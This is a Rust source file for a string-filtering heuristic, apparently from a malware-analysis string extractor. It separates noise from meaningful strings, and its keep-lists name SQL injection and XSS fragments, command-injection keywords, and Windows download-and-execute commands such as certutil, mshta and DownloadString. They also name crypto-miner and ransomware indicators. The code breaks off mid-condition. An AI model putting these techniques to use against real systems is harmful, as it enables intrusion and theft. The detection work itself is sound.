//! String validation utilities.
//!
//! Functions for validating and filtering string candidates to remove garbage
//! and low-quality strings.

/// Determines if a string appears to be garbage/noise rather than meaningful content.
///
/// This heuristic detects common patterns of misaligned reads and low-value strings:
/// - Short strings with non-alphanumeric characters
/// - Strings ending with backtick + letter + spaces (misaligned Go data)
/// - Strings with very low alphanumeric ratio
/// - Strings that are mostly whitespace padding
/// - Strings with embedded null or control characters
pub fn is_garbage(s: &str) -> bool {
    // Normalize: trim whitespace first
    let trimmed = s.trim();
    let len = trimmed.len();

    // Fast path: longer strings with normal patterns are rarely garbage
    // This avoids expensive analysis for the common case
    if trimmed.len() >= 12 {
        let bytes = trimmed.as_bytes();
        let first = bytes[0];
        // Quick check for all-same-character strings (garbage)
        if bytes.iter().all(|&b| b == first) {
            return true;
        }
        // If it starts with a letter and has mostly alphanumeric + common punctuation, skip full analysis
        if first.is_ascii_alphabetic() {
            let simple_chars = bytes
                .iter()
                .filter(|&&b| {
                    b.is_ascii_alphanumeric()
                        || b == b' '
                        || b == b'_'
                        || b == b'-'
                        || b == b'.'
                        || b == b'/'
                })
                .count();
            if simple_chars * 100 / bytes.len() >= 80 {
                return false;
            }
        }
    }

    // Special case: Cryptocurrency addresses (ransomware/miner IOCs)
    if len >= 26 && len <= 108 {
        // Bitcoin (legacy): starts with 1 or 3, 26-35 chars, base58
        // Bitcoin (bech32): starts with bc1, 42+ chars
        // Ethereum: starts with 0x, 42 chars hex
        // Monero: starts with 4 or 8, 95-108 chars
        // Litecoin: starts with L or M, 26-35 chars
        // Dogecoin: starts with D, 34 chars
        let looks_like_crypto = (trimmed.starts_with('1') || trimmed.starts_with('3'))
            || trimmed.starts_with("bc1")
            || (trimmed.starts_with("0x") && len == 42)
            || ((trimmed.starts_with('4') || trimmed.starts_with('8')) && len >= 90)
            || (trimmed.starts_with('L') || trimmed.starts_with('M'))
            || trimmed.starts_with('D');

        if looks_like_crypto {
            // Check if mostly alphanumeric (crypto addresses are base58/hex)
            let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
            if alnum_count * 100 / len >= 95 {
                return false; // Cryptocurrency addresses are NOT garbage
            }
        }
    }

    // Special case: Mining pool URLs and stratum protocol
    if trimmed.contains("stratum+tcp://") || trimmed.contains("stratum+ssl://") {
        return false; // Stratum URLs are NOT garbage
    }

    // Mining pool domains (common patterns)
    if (trimmed.contains("pool.") || trimmed.contains("nanopool") || trimmed.contains("minergate"))
        && (trimmed.contains(".com") || trimmed.contains(".org") || trimmed.contains(":"))
    {
        return false; // Mining pool URLs are NOT garbage
    }

    // Cryptocurrency miner software names
    if trimmed.contains("xmrig")
        || trimmed.contains("xmr-stak")
        || trimmed.contains("cpuminer")
        || trimmed.contains("ccminer")
        || trimmed.contains("ethminer")
        || trimmed.contains("phoenixminer")
        || trimmed.contains("t-rex")
        || trimmed.contains("--donate-level")
        || trimmed.contains("--algo=")
        || trimmed.contains("--cuda-devices")
        || (trimmed.contains("-o ") && trimmed.contains("-u "))
    {
        return false; // Miner software strings are NOT garbage
    }

    // Special case: Onion/Tor URLs (ransomware C2)
    if trimmed.contains(".onion") && len >= 10 {
        return false; // Tor addresses are NOT garbage
    }

    // Special case: CTF flag formats and GUIDs
    if trimmed.starts_with('{') && trimmed.ends_with('}') {
        // CTF flags: CTF{...}, flag{...}, FLAG{...}, etc.
        if len > 5 && (trimmed.contains("CTF{") || trimmed.contains("flag{") || trimmed.contains("FLAG{")
            || trimmed.contains("picoCTF{") || trimmed.contains("HTB{"))
        {
            return false; // CTF flags are NOT garbage
        }
        // GUIDs: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} (usually 38 chars with braces)
        // Be flexible: 36-38 chars, 4 dashes, mostly hex
        if (36..=38).contains(&len) {
            let dash_count = trimmed.chars().filter(|&c| c == '-').count();
            let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
            // GUID has 4 dashes and mostly hex digits (allow 30-32)
            if dash_count == 4 && hex_count >= 30 && hex_count <= 32 {
                return false; // GUIDs are NOT garbage
            }
        }
    }

    // Special case: Email addresses
    if trimmed.contains('@') && trimmed.contains('.') && len >= 6 {
        let at_count = trimmed.chars().filter(|&c| c == '@').count();
        let dot_count = trimmed.chars().filter(|&c| c == '.').count();
        // Valid email: single @, at least one dot, mostly alphanumeric + common chars
        if at_count == 1 && dot_count >= 1 {
            let valid_chars = trimmed.chars().filter(|c| {
                c.is_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | '+')
            }).count();
            if valid_chars * 100 / len >= 85 {
                return false; // Email addresses are NOT garbage
            }
        }
    }

    // Special case: Windows registry paths
    if trimmed.contains("HKLM\\") || trimmed.contains("HKCU\\") || trimmed.contains("HKEY_") {
        return false; // Registry paths are NOT garbage
    }

    // Special case: LDAP/AD paths
    if trimmed.contains("LDAP://") || (trimmed.contains("CN=") && trimmed.contains("DC=")) {
        return false; // LDAP paths are NOT garbage
    }

    // Special case: JWT tokens (3 base64 parts separated by dots)
    if trimmed.matches('.').count() == 2 && len >= 50 {
        let parts: Vec<&str> = trimmed.split('.').collect();
        if parts.len() == 3 && parts.iter().all(|p| !p.is_empty()) {
            // Check if all parts are base64-like (alphanumeric + - _)
            let base64_chars = trimmed.chars().filter(|c| {
                c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | '=')
            }).count();
            if base64_chars * 100 / len >= 95 {
                return false; // JWT tokens are NOT garbage
            }
        }
    }

    // Special case: PEM/RSA keys
    if trimmed.contains("-----BEGIN") || trimmed.contains("-----END") {
        return false; // PEM keys are NOT garbage
    }

    // Special case: SQL injection patterns
    if (trimmed.contains("' OR '") || trimmed.contains("1'='1"))
        || (trimmed.contains("UNION") && trimmed.contains("SELECT"))
        || trimmed.contains("admin'--")
    {
        return false; // SQL injection patterns are NOT garbage
    }

    // Special case: XSS payloads
    if (trimmed.contains("<script>") && trimmed.contains("</script>"))
        || (trimmed.contains("onerror=") && trimmed.contains("alert("))
        || trimmed.starts_with("javascript:")
    {
        return false; // XSS payloads are NOT garbage
    }

    // Special case: API key formats
    if (trimmed.starts_with("AKIA") && len >= 20)  // AWS
        || (trimmed.starts_with("ghp_") && len >= 36)  // GitHub
        || (trimmed.starts_with("sk_live_") || trimmed.starts_with("pk_live_"))  // Stripe
        || (trimmed.starts_with("xox") && len >= 30)  // Slack
    {
        let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric() || *c == '_').count();
        if alnum_count * 100 / len >= 90 {
            return false; // API keys are NOT garbage
        }
    }

    // Special case: Code patterns commonly found in malware
    // Detect various language-specific obfuscation patterns

    // C/C++ patterns
    if trimmed.contains("__attribute__")
        || trimmed.contains("#define")
        || trimmed.contains("#include")
        || (trimmed.contains("char *") && trimmed.contains("0x"))
        || (trimmed.contains("((") && trimmed.contains("))") && trimmed.contains("0x"))
    {
        return false; // C/C++ code is NOT garbage
    }

    // PHP patterns
    if trimmed.contains("eval(")
        || trimmed.contains("base64_decode(")
        || trimmed.contains("$_GET")
        || trimmed.contains("$_POST")
        || trimmed.contains("$_SERVER")
        || trimmed.contains("$_COOKIE")
        || trimmed.contains("$GLOBALS")
        || trimmed.contains("preg_replace(")
        || (trimmed.starts_with("${") && trimmed.contains("}"))
    {
        return false; // PHP code is NOT garbage
    }

    // Perl patterns
    if trimmed.contains("pack(")
        || trimmed.contains("$ARGV")
        || trimmed.contains("eval(")
        || (trimmed.contains("open(") && trimmed.contains("|"))
    {
        return false; // Perl code is NOT garbage
    }

    // Shell patterns
    if trimmed.contains("${IFS}")
        || (trimmed.contains("$(") && trimmed.contains(")"))
        || (trimmed.contains("eval") && (trimmed.contains("base64") || trimmed.contains("echo")))
    {
        return false; // Shell code is NOT garbage
    }

    // Command injection patterns (CTF/pentesting)
    if (trimmed.contains("; ") && (trimmed.contains("cat") || trimmed.contains("wget") || trimmed.contains("curl")))
        || (trimmed.contains("| ") && (trimmed.contains("whoami") || trimmed.contains("id") || trimmed.contains("uname")))
        || (trimmed.starts_with('`') && trimmed.ends_with('`'))
    {
        return false; // Command injection patterns are NOT garbage
    }

    // Windows command patterns (malware persistence)
    if trimmed.contains("schtasks")
        || trimmed.contains("net user")
        || trimmed.contains("reg add")
        || trimmed.contains("powershell")
        || trimmed.contains("certutil")
        || trimmed.contains("mshta")
        || trimmed.contains("IEX(")
        || trimmed.contains("DownloadString")
    {
        return false; // Windows malware commands are NOT garbage
    }

    // Ransom note patterns
    if trimmed.contains("ENCRYPTED") || trimmed.contains("DECRYPT") || trimmed.contains("Bitcoin") {
        let uppercase_count = trimmed.chars().filter(|c| c.is_uppercase()).count();
        // If mostly uppercase with these keywords, likely a ransom message
        if uppercase_count * 100 / len > 50 {
            return false; // Ransom messages are NOT garbage
        }
    }

    // Special case: Obfuscated JavaScript/code patterns with hex identifiers
    // Common in malware: _0x1c1000, _0x230d, function _0x..., const _0x..., etc.
    // Detect by presence of _0x pattern (hex identifier prefix used in obfuscation)
    if trimmed.contains("_0x") || (trimmed.contains("0x") && trimmed.len() >= 10) {
        // Check if it looks like code:
        // 1. JavaScript keywords, OR
        // 2. Function/array syntax (parentheses or brackets), OR
        // 3. Multiple hex identifiers (common in obfuscated code)
        let has_keywords = trimmed.contains("function")
            || trimmed.contains("const")
            || trimmed.contains("var")
            || trimmed.contains("let")
            || trimmed.contains("return")
            || trimmed.contains("if");
        let has_code_syntax = trimmed.contains('(') || trimmed.contains('[') || trimmed.contains('{');
        let hex_id_count = trimmed.matches("_0x").count() + trimmed.matches("0x").count();

        if has_keywords || has_code_syntax || hex_id_count >= 2 {
            // Verify reasonable alphanumeric content (not just gibberish)
            let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
            if alnum_count >= 6 {
                return false; // Obfuscated JavaScript/code is NOT garbage
            }
        }
    }

    // Special case: HTTP headers (common in network traffic analysis)
    if (trimmed.starts_with("Host:")
        || trimmed.starts_with("User-Agent:")
        || trimmed.starts_with("Content-Type:")
        || trimmed.starts_with("Accept:")
        || trimmed.starts_with("Authorization:")
        || trimmed.starts_with("Cookie:"))
        && trimmed.len() >= 10
    {
        return false; // HTTP headers are NOT garbage
    }

    // Special case: Comma-separated lists (locales, encodings, languages)
    if trimmed.contains(',') && trimmed.len() >= 10 {
        let parts: Vec<&str> = trimmed.split(',').collect();
        if parts.len() >= 2 {
            // Check if parts look like identifiers (alphanumeric with dashes/underscores)
            let valid_parts = parts
                .iter()
                .filter(|p| {
                    !p.is_empty()
                        && p.chars()
                            .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.')
                })
                .count();
            // If most parts are valid identifiers, it's a list
            if valid_parts * 100 / parts.len() >= 75 {
                return false; // Comma-separated lists are NOT garbage
            }
        }
    }

    // Special case: Shell command patterns (check before control char rejection)
    // These often have garbage bytes before/after but are still valuable
    // Examples: "osascript", "bash", "sh ", "/bin/", "2>&1", "<<EOD"
    if trimmed.contains("osascript")
        || trimmed.contains("bash")
        || trimmed.contains("/bin/sh")
        || trimmed.contains("/bin/bash")
        || trimmed.contains("2>&1")
        || trimmed.contains("<<")  // heredocs: <<EOD, <<EOF, <<END, etc.
        || trimmed.contains("2>/dev/null")
        || trimmed.contains("2>")
        || (trimmed.contains(" sh ") || trimmed.starts_with("sh ") || trimmed.ends_with(" sh"))
    {
        // BUT: if the string is mostly gibberish (too many special chars), reject it
        let special_count = trimmed
            .chars()
            .filter(|c| !c.is_alphanumeric() && !c.is_whitespace())
            .count();
        let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();

        // Real shell commands should have reasonable alphanumeric content
        // Reject if <40% alphanumeric or if special chars dominate
        if alnum_count * 100 / trimmed.len() < 40 || special_count > alnum_count {
            // Continue to normal garbage checks
        } else {
            return false; // Shell commands are NOT garbage
        }
    }

    // Check for control characters in non-trailing-newline portion
    let check_control = s.trim_end_matches('\n');
    for c in check_control.chars() {
        if c.is_control() {
            return true;
        }
    }

    // Check for literal escape sequences that indicate corrupted/malformed data
    // Legitimate code might have these, but raw strings with \x, \u sequences are usually garbage
    if trimmed.len() < 30 && (trimmed.contains("\\x") || trimmed.contains("\\u") || trimmed.contains("\\U")) {
        // If it's not in a code-like context (no quotes, parentheses, etc.), it's garbage
        let has_code_context = trimmed.contains('"') || trimmed.contains('\'')
            || trimmed.contains('(') || trimmed.contains('[')
            || trimmed.contains("print") || trimmed.contains("echo")
            || trimmed.contains("const") || trimmed.contains("var");
        if !has_code_context {
            return true;
        }
    }

    // Empty or whitespace-only
    if len == 0 {
        return true;
    }

    // Single characters are almost always garbage from raw scans
    if len == 1 {
        return true;
    }

    // Special case: MAC addresses (00:1A:2B:3C:4D:5E, 00-1A-2B-3C-4D-5E, 001A.2B3C.4D5E)
    if len >= 12 && len <= 17 {
        // Colon format: 00:1A:2B:3C:4D:5E (17 chars)
        // Dash format: 00-1A-2B-3C-4D-5E (17 chars)
        // Cisco format: 001A.2B3C.4D5E (14 chars)
        let colon_count = trimmed.chars().filter(|&c| c == ':').count();
        let dash_count = trimmed.chars().filter(|&c| c == '-').count();
        let dot_count = trimmed.chars().filter(|&c| c == '.').count();
        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();

        // Colon or dash format: 5 separators, 12 hex digits
        if (colon_count == 5 || dash_count == 5) && hex_count == 12 {
            return false;
        }
        // Cisco format: 2 dots, 12 hex digits
        if dot_count == 2 && hex_count == 12 {
            return false;
        }
    }

    // Special case: IPv6 addresses (contains :: or multiple colons with hex)
    if len >= 3 && trimmed.contains(':') {
        let colon_count = trimmed.chars().filter(|&c| c == ':').count();
        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
        // IPv6 has at least 2 colons and mostly hex digits
        // ::1 (shortest), fe80::1, 2001:db8::1, etc.
        if colon_count >= 2 && hex_count >= 1 {
            // Check if it's mostly hex and colons (>80%)
            let hex_and_colon = trimmed.chars().filter(|c| c.is_ascii_hexdigit() || *c == ':' || *c == '.').count();
            if hex_and_colon * 100 / len > 80 {
                return false;
            }
        }
    }

    // Special case: Crypto hashes and keys (long hex strings)
    if len >= 32 && len <= 128 {
        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
        // If >95% hex digits, it's likely a hash/key
        if hex_count * 100 / len > 95 {
            return false;
        }
    }

    // Special case: locale strings (en_US, zh_CN, etc.)
    // Format: 2-3 lowercase letters + underscore + 2-3 uppercase letters
    if len == 5 || len == 6 {
        let chars: Vec<char> = trimmed.chars().collect();
        if chars.len() >= 5 {
            let has_locale_pattern = (chars[0].is_ascii_lowercase()
                && chars[1].is_ascii_lowercase()
                && chars[2] == '_'
                && chars[3].is_ascii_uppercase()
                && chars[4].is_ascii_uppercase())
                || (chars.len() == 6
                    && chars[0].is_ascii_lowercase()
                    && chars[1].is_ascii_lowercase()
                    && chars[2].is_ascii_lowercase()
                    && chars[3] == '_'
                    && chars[4].is_ascii_uppercase()
                    && chars[5].is_ascii_uppercase());
            if has_locale_pattern {
                return false; // Locale strings are NOT garbage
            }
        }
    }

    // Special case: XML/plist tags (<array>, <dict>, <key>, etc.)
    if trimmed.starts_with('<') && trimmed.ends_with('>') && len >= 3 {
        let inner = &trimmed[1..trimmed.len() - 1];
        // Valid XML tag if inner content is alphanumeric (possibly with / for closing tags)
        let is_valid_tag = inner.chars().all(|c| c.is_alphanumeric() || c == '/');
        if is_valid_tag && !inner.is_empty() {
            return false; // XML tags are NOT garbage
        }
    }

    // Special case: Shell command patterns with redirections and heredocs
    // Examples: "osascript 2>&1 <<EOD", "command 2>/dev/null", "cmd > output.txt"
    if trimmed.contains("2>&1")  // stderr redirect to stdout
        || trimmed.contains("2>")  // stderr redirect to file
        || trimmed.contains("<<")  // heredoc
        || (trimmed.contains(" > ") && trimmed.split_whitespace().count() >= 2)
    // redirect with spaces (require spaces around > to avoid false positives like "rL*>@")
    {
        // Check if it looks like a command (has alphanumeric content and mostly ASCII)
        let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
        let ascii_chars = trimmed.chars().filter(|c| c.is_ascii()).count();
        // Must have at least 3 alphanumeric AND be mostly ASCII (>80%)
        if alnum_count >= 3 && ascii_chars * 100 / trimmed.chars().count() > 80 {
            return false; // Shell commands with redirections are NOT garbage
        }
    }

    // Single-pass character counting
    let mut upper = 0usize;
    let mut lower = 0usize;
    let mut digit = 0usize;
    let mut alpha = 0usize;
    let mut whitespace = 0usize;
    let mut noise_punct = 0usize;
    let mut open_parens = 0usize;
    let mut close_parens = 0usize;
    let mut quotes = 0usize;
    let mut special = 0usize;
    let mut hex_only = 0usize;
    let mut ascii_count = 0usize;
    let mut alternations = 0usize;
    let mut prev_is_digit: Option<bool> = None;
    let mut first_char: Option<char> = None;
    let mut all_same = true;
    let mut last_char = '\0';
    let mut has_non_hex_letter = false;

    for c in trimmed.chars() {
        // Track first/last and uniformity
        if first_char.is_none() {
            first_char = Some(c);
        } else if all_same && Some(c) != first_char {
            all_same = false;
        }
        last_char = c;

        // ASCII check
        if c.is_ascii() {
            ascii_count += 1;
        }

        // Character type counting
        if c.is_ascii_uppercase() {
            upper += 1;
            alpha += 1;
            if !c.is_ascii_hexdigit() {
                has_non_hex_letter = true;
            }
            hex_only += 1;
            // Alternation tracking
            if prev_is_digit == Some(true) {
                alternations += 1;
            }
            prev_is_digit = Some(false);
        } else if c.is_ascii_lowercase() {
            lower += 1;
            alpha += 1;
            if !c.is_ascii_hexdigit() {
                has_non_hex_letter = true;
            }
            hex_only += 1;
            if prev_is_digit == Some(true) {
                alternations += 1;
            }
            prev_is_digit = Some(false);
        } else if c.is_ascii_digit() {
            digit += 1;
            hex_only += 1;
            if prev_is_digit == Some(false) {
                alternations += 1;
            }
            prev_is_digit = Some(true);
        } else if c.is_alphabetic() {
            // Non-ASCII alphabetic
            alpha += 1;
            if prev_is_digit == Some(true) {
                alternations += 1;
            }
            prev_is_digit = Some(false);
        } else if c.is_whitespace() {
            whitespace += 1;
        } else {
            // Punctuation/special characters
            match c {
                '#' | '@' | '?' | '>' | '<' | '|' | '\\' | '^' | '`' | '~' | '$' | '+' | '&'
                | '*' | '=' | ';' | ':' | '!' | ',' => noise_punct += 1,
                '(' | '[' | '{' => open_parens += 1,
                ')' | ']' | '}' => close_parens += 1,
                '"' | '\'' => quotes += 1,
                _ => {}
            }
            if !c.is_alphanumeric() && !c.is_whitespace() {
                special += 1;
            }
        }
    }

    let alphanumeric = alpha + digit;
    let first_char = trimmed.chars().next().unwrap_or(' ');

    // Very short strings (2-6 chars) that look like random binary data
    if (2..=6).contains(&len) {
        let is_all_upper = upper == len;
        let is_all_lower = lower == len;
        let is_all_digit = digit == len;
        // Allow identifier-like patterns: leading digit(s) + uppercase only (e.g., "8BIM", "3DES", "2D")
        // Digits must be at the START only, not interspersed (reject "9N2A", "0YI0")
        let is_digit_upper_id = first_char.is_ascii_digit()
            && upper > 0
            && lower == 0
            && special == 0
            && trimmed
                .chars()
                .skip_while(char::is_ascii_digit)
                .all(|c| c.is_ascii_uppercase());
        // Allow PascalCase words: leading uppercase + rest lowercase, no digits (e.g., "Bool", "Exif", "Time")
        let is_pascal_case =
            first_char.is_ascii_uppercase() && upper == 1 && lower > 0 && digit == 0;
        // Allow camelCase words: leading lowercase + one uppercase NOT at end, no digits (e.g., "someWord")
        // Reject patterns like "phbS" (uppercase at end) or "gnzUrs" (too short to verify)
        // camelCase needs at least 7 chars to be recognizable (e.g., "myValue")
        let last_char = trimmed.chars().last().unwrap_or(' ');
        let is_camel_case = len >= 7
            && first_char.is_ascii_lowercase()
            && upper == 1
            && digit == 0
            && !last_char.is_ascii_uppercase();
        // Allow lowercase + trailing digits (e.g., "amd64", "utf8", "sha256")
        // Must start with lowercase, not digit (reject "8oz1")
        let is_lower_with_suffix = first_char.is_ascii_lowercase()
            && lower > 0
            && upper == 0
            && digit > 0
            && last_char.is_ascii_digit();

        if !(is_all_upper
            || is_all_lower
            || is_all_digit
            || is_digit_upper_id
            || is_pascal_case
            || is_camel_case
            || is_lower_with_suffix)
        {
            // Mixed case with digits in short strings is usually garbage
            if digit > 0 && (upper > 0 || lower > 0) {
                return true;
            }
            // Irregular mixed case patterns are usually garbage from compressed data
            // (e.g., "zVQO", "IKfB", "phbS", "OsVLJ", "HQIld")
            if upper > 0 && lower > 0 {
                return true;
            }
            // Short strings with internal whitespace are garbage (e.g., "VW N", "5c 9")
            if whitespace > 0 {
                return true;
            }
        }
    }

    // Short strings with noise punctuation are garbage (expanded range for compressed data)
    if len <= 10 && noise_punct > 0 {
        return true;
    }

    // Strings with trailing spaces after short content often indicate misaligned reads
    if s.ends_with(' ') && len < 10 && alphanumeric < 4 {
        return true;
    }

    // Pattern: ends with backtick + single letter + optional spaces (Go misaligned reads)
    let bytes = trimmed.as_bytes();
    if len >= 2 {
        if let Some(idx) = bytes.iter().rposition(|&b| b.is_ascii_alphabetic()) {
            if idx > 0 && bytes[idx - 1] == b'`' {
                return true;
            }
        }
    }

    // Very short strings with special chars are usually garbage
    if len <= 4 && alphanumeric < len / 2 {
        return true;
    }

    // Short strings with unbalanced or unusual punctuation patterns
    if len <= 8 && (open_parens != close_parens || quotes == 1) {
        return true;
    }

    // Short strings that look like misaligned binary
    if len <= 6 {
        if upper > 0 && special > 0 && alpha == upper {
            return true;
        }
        // Short strings with special chars are usually garbage, BUT:
        // - Filenames with single '.' (e.g., "a.out", "d.exe", "lib.so") are OK
        // - Section/path prefixes starting with '.' (e.g., ".text", ".data", ".init") are OK
        if special > 0 && len <= 5 {
            // Count dots
            let dot_count = trimmed.chars().filter(|&c| c == '.').count();
            // If it's ONLY dots as special chars, it might be a filename or section name
            if dot_count == special {
                // Single dot in the middle (filename: "d.exe", "a.out")
                // OR starts with dot (section name: ".text", ".data", ".bss")
                let is_filename_pattern =
                    (dot_count == 1 && !trimmed.starts_with('.') && !trimmed.ends_with('.'))
                        || trimmed.starts_with('.');
                if is_filename_pattern && alphanumeric > 0 {
                    // Not garbage - looks like a filename or section name
                } else {
                    return true;
                }
            } else {
                // Has other special chars besides dots - likely garbage
                return true;
            }
        }
    }

    // Medium-length strings (5-10 chars) with mixed case and digits are usually noise
    // from compressed data (e.g., "fprzTR8", "J=22KJT", "V1rN:R")
    // Exclude legitimate patterns like version strings, dates, paths
    if (5..=10).contains(&len) && digit > 0 && upper > 0 && lower > 0 {
        // Allow patterns that look like versions (go1.22, v1.0) or dates
        let looks_like_version = trimmed.starts_with("go")
            || trimmed.starts_with('v')
            || trimmed.starts_with('V')
            || trimmed.contains('.');
        if !looks_like_version {
            return true;
        }
    }

    // Short strings (5-8 chars) with all uppercase + digits but irregular pattern
    // are usually garbage (e.g., "55LYE", "0GZF")
    if (5..=8).contains(&len) && digit > 0 && alpha == upper && lower == 0 && special == 0 {
        // Allow patterns like "HTTP2", "UTF8" where digit is at the end
        let last_char = trimmed.chars().last().unwrap_or(' ');
        let first_char = trimmed.chars().next().unwrap_or(' ');
        if first_char.is_ascii_digit() || (!last_char.is_ascii_digit() && digit > 0) {
            return true;
        }
    }

    // Strings that are mostly non-alphanumeric
    if len >= 4 && alphanumeric == 0 {
        return true;
    }

    // Alternating digit-letter patterns
    if len >= 6 && digit > 0 && alpha > 0 && alternations >= 4 && alternations * 2 >= len {
        return true;
    }

    // Very low ratio of alphanumeric characters
    if len > 6 && alphanumeric * 100 / len < 30 {
        return true;
    }

    // Strings that look like random hex/binary data
    if len >= 8
        && !has_non_hex_letter
        && hex_only == len
        && digit > 0
        && alpha > 0
        && !trimmed.contains('.')
        && !trimmed.starts_with("0x")
    {
        return true;
    }

    // Single repeated character
    if len >= 4 && all_same {
        return true;
    }

    // Strings with excessive whitespace relative to content
    if whitespace > 0 && whitespace * 3 > len {
        return true;
    }

    // Strings with excessive non-ASCII characters are often misaligned reads or corrupted data
    let non_ascii_count = len - ascii_count;

    // For short strings (< 30 chars), be strict about non-ASCII content
    if non_ascii_count > 0 && len < 30 {
        // If non-ASCII chars are more than 20% of the string, it's likely garbage
        if non_ascii_count * 100 / len > 20 {
            return true;
        }
        // Even 1-2 non-ASCII chars in very short strings (< 10) is suspicious
        if len < 10 && non_ascii_count >= 2 {
            return true;
        }
    }

    // For longer strings, check if non-ASCII chars dominate
    if non_ascii_count > 0 && len >= 30 {
        // If more than 30% non-ASCII, it's garbage (corrupted or misaligned)
        if non_ascii_count * 100 / len > 30 {
            return true;
        }
    }

    // Short strings ending with unusual unicode are suspicious
    if !last_char.is_ascii() && len < 15 && alphanumeric < len / 2 {
        return true;
    }

    // Special case: Obfuscated Python patterns with mangled identifiers
    // Common in malware: llIIlIlllllIIlllII, IlIlIlIIIIllI, etc.
    // These use mixed case with lots of I and l to confuse readers
    if (trimmed.contains("def ")
        || trimmed.contains("return ")
        || trimmed.contains("import ")
        || trimmed.contains(".replace("))
        && len >= 20
    {
        // Check if it has Python-like structure: lots of mixed case identifiers
        let has_many_identifiers = upper > 5 && lower > 5;
        let has_reasonable_alnum = alphanumeric >= 12;

        if has_many_identifiers && has_reasonable_alnum {
            return false; // Obfuscated Python is NOT garbage
        }
    }

    // Character class contiguous region analysis
    // Legitimate strings have longer runs of the same character class (lowercase, uppercase, digits)
    // Garbage strings alternate chaotically between classes
    if len >= 6 {
        // Define character classes for each character
        #[derive(PartialEq, Eq, Clone, Copy)]
        enum CharClass {
            Upper,
            Lower,
            Digit,
            Special,
            Whitespace,
        }

        let char_classes: Vec<CharClass> = trimmed
            .chars()
            .map(|c| {
                if c.is_ascii_uppercase() {
                    CharClass::Upper
                } else if c.is_ascii_lowercase() {
                    CharClass::Lower
                } else if c.is_ascii_digit() {
                    CharClass::Digit
                } else if c.is_whitespace() {
                    CharClass::Whitespace
                } else {
                    CharClass::Special
                }
            })
            .collect();

        // Count transitions and track run lengths
        let mut transitions = 0;
        let mut run_lengths: Vec<usize> = Vec::new();
        let mut current_run_length = 1;

        for i in 1..char_classes.len() {
            if char_classes[i] == char_classes[i - 1] {
                current_run_length += 1;
            } else {
                transitions += 1;
                run_lengths.push(current_run_length);
                current_run_length = 1;
            }
        }
        run_lengths.push(current_run_length); // Don't forget the last run

        // Calculate average run length
        let total_run_chars: usize = run_lengths.iter().sum();
        let avg_run_length = if run_lengths.is_empty() {
            0.0
        } else {
            total_run_chars as f32 / run_lengths.len() as f32
        };

        // Check if string is dominated by one character class (>70%)
        // Include special characters in the check - strings with mostly special chars
        // are often legitimate (like shell commands, format strings, etc.)
        let max_class_count = upper.max(lower).max(digit).max(special);
        let is_mostly_one_class = max_class_count * 100 / len > 70;

        // Check for structured patterns that naturally have many transitions
        // These should be exempt from alternation checks
        // Paths need more than just a slash - require alphanumeric content and reasonable structure
        // Also reject if too many special characters (real paths are usually <20% special)
        // AND require mostly lowercase (real paths are typically lowercase)
        let looks_like_path = (trimmed.contains('/') || trimmed.contains('\\'))
            && alphanumeric >= 3
            && special * 100 / len <= 30
            && (alphanumeric == 0 || lower * 100 / alphanumeric >= 40)  // At least 40% of alphanumeric chars are lowercase
            && (trimmed.starts_with('/')
                || trimmed.starts_with('\\')
                || trimmed.contains("/.")
                || trimmed.contains("\\.")
                || trimmed.split(&['/', '\\'][..]).filter(|s| !s.is_empty()).count() >= 2);
        let looks_like_url = trimmed.contains("://") || trimmed.contains("http");
        // Domains should have reasonable structure: mostly alphanumeric, dots, hyphens, underscores
        // Reject if too many special characters (real domains have <20% special)
        let looks_like_domain = trimmed.contains('.')
            && trimmed.split('.').filter(|s| !s.is_empty()).count() >= 2
            && special * 100 / len <= 20;
        let looks_like_version =
            (trimmed.starts_with("go") || trimmed.starts_with('v') || trimmed.starts_with('V'))
                && trimmed.contains('.')
                && digit > 0;
        // Base64 strings have uniform character distribution but many transitions
        // They only contain [A-Za-z0-9+/=] and often end with =
        let looks_like_base64 = len >= 16
            && upper > 0
            && lower > 0
            && trimmed
                .chars()
                .all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=');
        // Format strings contain % followed by format specifiers (s, d, f, x, v, etc.)
        let looks_like_format_string = trimmed.contains("%s")
            || trimmed.contains("%d")
            || trimmed.contains("%f")
            || trimmed.contains("%x")
            || trimmed.contains("%v")
            || trimmed.contains("%p")
            || trimmed.contains("%c")
            || trimmed.contains("%u");
        let is_structured_pattern = looks_like_path
            || looks_like_url
            || looks_like_domain
            || looks_like_version
            || looks_like_base64
            || looks_like_format_string;

        // Reject strings with excessive alternation and short runs
        // Exception: strings dominated by one class (like all-uppercase acronyms)
        // Exception: structured patterns (paths, URLs, domains, versions)
        if !is_mostly_one_class && !is_structured_pattern {
            // Too many transitions relative to length (>60% of positions are transitions)
            if transitions * 100 / len > 60 {
                return true;
            }

            // Very short average run length indicates random alternation
            // Avg run length < 2.0 means mostly 1-char runs (chaotic alternation)
            if avg_run_length < 2.0 && len >= 8 {
                return true;
            }

            // For shorter strings (6-7 chars), be even stricter
            if len <= 7 && avg_run_length < 1.5 && transitions >= 4 {
                return true;
            }
        } else if is_structured_pattern && avg_run_length < 2.0 && len >= 10 {
            // Even "structured" patterns shouldn't be TOO chaotic
            // Reject if very short runs (< 2.0) in strings ≥10 chars
            // This catches garbage that looks like paths/domains but has random alternation
            // EXCEPTION: Don't apply this check to recognized structured patterns since they naturally create short runs
            // (e.g., "/usr/lib/go" has runs: /, usr, /, lib, /, go = avg 1.83)
            // (e.g., "Photoshop 3.0" has runs: P, hotoshop, space, 3, ., 0 = avg 2.17)
            // (e.g., "VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl" = avg 1.78, typical for base64)
            // (e.g., "Error: %s at line %d" = avg 1.54, typical for format strings)
            // Only reject if VERY chaotic (< 2.0) AND not a recognized structured pattern
            if !looks_like_path
                && !looks_like_domain
                && !looks_like_version
